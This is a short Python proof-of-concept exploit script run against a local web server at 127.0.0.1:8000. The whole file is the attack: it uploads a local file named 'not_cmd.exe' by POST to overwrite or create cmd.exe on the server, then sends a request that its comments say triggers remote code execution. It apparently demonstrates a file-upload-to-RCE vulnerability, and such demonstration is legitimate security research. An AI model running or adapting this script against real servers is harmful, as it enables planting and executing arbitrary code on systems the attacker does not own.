from urllib.request import Request, urlopen
from time import strftime, localtime, sleep

print("[*]", strftime("%Y-%m-%d %H:%M:%S", localtime()), "Simple GET request to see the default behaviour...")
get_response = urlopen("http://127.0.0.1:8000/")
sleep(2)
print("[+]", strftime("%Y-%m-%d %H:%M:%S", localtime()), "Start exploit with upload a malicious cmd.exe file...")
post_response = urlopen(Request("http://127.0.0.1:8000/cmd.exe", data=open('not_cmd.exe', 'rb').read())) # write a cmd.exe file
sleep(2)
print("[+]", strftime("%Y-%m-%d %H:%M:%S", localtime()), "RCE with malicious cmd.exe file...")
exploit_response = urlopen("http://127.0.0.1:8000/")